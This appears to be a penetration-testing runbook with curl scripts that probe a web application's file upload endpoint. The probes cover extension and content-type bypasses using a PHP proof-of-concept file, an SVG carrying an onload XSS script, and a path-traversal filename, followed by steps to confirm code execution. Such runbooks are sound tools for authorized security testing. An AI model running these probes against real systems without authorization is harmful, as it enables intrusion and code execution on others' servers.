# File Upload Probe Runbook

## Purpose
Low-impact probing of file upload endpoints. Test extension bypass, content-type bypass, SVG XSS, and path traversal — without uploading actual malicious payloads.

## Variables
- `$TARGET_URL` — upload endpoint URL
- `$OUTDIR` — output directory
- `$COOKIE_JAR` — authenticated session
- `$PAYLOAD_DIR` — `$OUTDIR/payloads`
- `$EVIDENCE_DIR` — `$OUTDIR/evidence/file-upload`

## Workflow A — Extension Bypass Probing

### A1. Test double extension
```bash
echo "<?php echo 'poc'; ?>" > "$PAYLOAD_DIR/test.php.jpg"
curl -sk -v -F "file=@$PAYLOAD_DIR/test.php.jpg" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-double-ext-response.txt" 2>"$OUTDIR/upload-double-ext-headers.txt"
grep -qiE '200|201|success' "$OUTDIR/upload-double-ext-response.txt" && echo "DOUBLE EXTENSION ACCEPTED: .php.jpg" >> "$OUTDIR/upload-hits.txt"
```

### A2. Test null byte injection
```bash
printf "<?php echo 'poc'; ?>" > "$PAYLOAD_DIR/shell.php\x00.jpg" 2>/dev/null
# null byte may not work in filename — use form encoding instead
echo "<?php echo 'poc'; ?>" > "$PAYLOAD_DIR/shell.php"
curl -sk -v -F "filename=shell.php%00.jpg" -F "file=@$PAYLOAD_DIR/shell.php" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-null-byte-response.txt" 2>"$OUTDIR/upload-null-byte-headers.txt"
grep -qiE '200|201|success' "$OUTDIR/upload-null-byte-response.txt" && echo "NULL BYTE ACCEPTED: shell.php%00.jpg" >> "$OUTDIR/upload-hits.txt"
```

### A3. Test case variation
```bash
echo "benign" > "$PAYLOAD_DIR/test.PhP"
curl -sk -F "file=@$PAYLOAD_DIR/test.PhP" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-case-response.txt"
grep -qiE '200|201|success' "$OUTDIR/upload-case-response.txt" && echo "CASE BYPASS ACCEPTED: .PhP" >> "$OUTDIR/upload-hits.txt"
```

### A4. Test alternative executable extensions
```bash
for ext in php3 php4 php5 phtml pht phar phps shtml inc cgi pl py rb jsp jspx asp aspx ashx asmx cfm cfc; do
  echo "benign" > "$PAYLOAD_DIR/test.$ext"
  CODE=$(curl -sk -o /dev/null -w "%{http_code}" "$TARGET_URL" -F "file=@$PAYLOAD_DIR/test.$ext" -b "$COOKIE_JAR")
  [ "$CODE" = "200" ] || [ "$CODE" = "201" ] && echo "EXEC EXTENSION ACCEPTED: .$ext ($CODE)" >> "$OUTDIR/upload-hits.txt"
done
```

### A5. Test trailing characters (dots, spaces, slashes)
```bash
for suffix in '.' ' ' '/' '. .'; do
  echo "benign" > "$PAYLOAD_DIR/test.php$suffix"
  curl -sk -F "file=@$PAYLOAD_DIR/test.php$suffix" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-suffix-$suffix.txt"
  grep -qiE '200|201|success' "$OUTDIR/upload-suffix-$suffix.txt" && echo "TRAILING CHAR ACCEPTED: .php$suffix" >> "$OUTDIR/upload-hits.txt"
done
```

## Workflow B — Content-Type Bypass Probing

### B1. Upload PHP code with image MIME type
```bash
echo "<?php echo 'poc'; ?>" > "$PAYLOAD_DIR/php-as-image.php"
curl -sk -v -F "file=@$PAYLOAD_DIR/php-as-image.php;type=image/jpeg" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-content-type-response.txt" 2>"$OUTDIR/upload-content-type-headers.txt"
grep -qiE '200|201|success' "$OUTDIR/upload-content-type-response.txt" && echo "CONTENT-TYPE BYPASS: image/jpeg mime accepted" >> "$OUTDIR/upload-hits.txt"
```

## Workflow C — SVG XSS Probing

### C1. Upload SVG with embedded script
```bash
cat > "$PAYLOAD_DIR/xss.svg" << 'SVGEOF'
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100" fill="red"/>
</svg>
SVGEOF
curl -sk -F "file=@$PAYLOAD_DIR/xss.svg" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-svg-response.txt"
grep -qiE '200|201|success' "$OUTDIR/upload-svg-response.txt" && echo "SVG XSS ACCEPTED" >> "$OUTDIR/upload-hits.txt"
```

## Workflow D — Path Traversal Probing

### D1. Test path traversal in filename
```bash
echo "traversal test" > "$PAYLOAD_DIR/traversal.txt"
curl -sk -F "filename=../../etc/test.txt" -F "file=@$PAYLOAD_DIR/traversal.txt" -b "$COOKIE_JAR" "$TARGET_URL" -o "$OUTDIR/upload-traversal-response.txt"
grep -qiE 'success|200|201' "$OUTDIR/upload-traversal-response.txt" && echo "PATH TRAVERSAL IN FILENAME ACCEPTED" >> "$OUTDIR/upload-hits.txt"
```

## Signals
| Signal | Confidence | Action |
|---|---|---|
| Double extension (.php.jpg) accepted | High | Verify code execution |
| Alternative extension (.phtml) accepted | High | Verify code execution |
| SVG with script accepted and served | Medium | Verify XSS on served SVG |
| Content-type bypass works | Medium | Verify full upload + execute |
| Path traversal in filename accepted | High | Verify with actual file overwrite |
| Null byte accepted | High | Verify code execution |

## False Positive Patterns
- Upload "accepted" (200) but file stripped of code: check response for actual file content
- Extension bypass works but file served with Content-Disposition:attachment: check if XSS possible in download context
- SVG uploaded but served from different domain: test that domain's cookie scope

## Next Routing
- Any bypass technique works -> `runbooks/03-verify.md`
- All extensions blocked, but SVG accepted -> verify SVG XSS
- No bypass works -> try server-specific techniques or stop
